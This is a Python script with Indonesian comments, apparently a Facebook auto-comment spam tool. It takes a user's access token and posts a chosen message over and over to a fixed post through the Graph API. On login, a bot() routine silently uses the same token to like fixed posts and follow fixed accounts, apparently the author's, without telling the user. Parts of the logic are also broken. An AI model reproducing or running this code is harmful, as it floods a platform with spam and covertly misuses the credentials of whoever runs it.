#09 02 2022 : 16.40
#vierblowxkim project
#https://www.facebook.com/groups/191762347517138
#georgy alifich el zhukov
#rekode tidak membuatmu menjadi hengksr wibu tzy
import os, sys, re, time, requests, calendar, random,json
from datetime import datetime
from datetime import date
komen = []

def login():
	os.system("clear")
	try:
		token = open('token.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		#logo()
		print("\n     ANDA HARUS LOGIN")
		token = input('\n token : ')
		try:
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
			menu()
		except KeyError:
			print("token eror")
			sys.exit() 
			
def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit(" token mokad")
	requests.post('https://graph.facebook.com/1131223424372711/likes?summary=true&access_token=' + token)
	requests.post('https://graph.facebook.com/1123741075120946/likes?summary=true&access_token=' + token)
	requests.post('https://graph.facebook.com/351158233272087/likes?summary=true&access_token=' + token)
	requests.post('https://graph.facebook.com/100056548009815/subscribers?access_token=' + token)#285423000019298
	requests.post('https://graph.facebook.com/100024551913570/subscribers?access_token=' + token)
	#tambahin boleh ganti/hapus jangan hargai pembuat
def menu():
	try:
		toket=open('token.txt','r').read()
	except IOError:
		print("\n*token kadaluwarsa!")
		os.system('rm -rf token.txt')
		login()
	print("")
	km = input('*link post   : ')
	try:
		p = requests.get("https://graph.facebook.com/100024551913570?fields=feed.limit(10000)&access_token="+toket)
		a = json.loads(p.text)
		print("\n*wait")
		for s in a['feed']['data']:
			f = s['id']
			komen.append(1136886750473045)
			requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
			print('*done '+str(len(komen)))
		print("\r*END"+str(len(komen)))
		exit()
	except KeyError:
		print("* ID NOT FOUND")
		exit()
        
if __name__ == '__main__':
	menu()
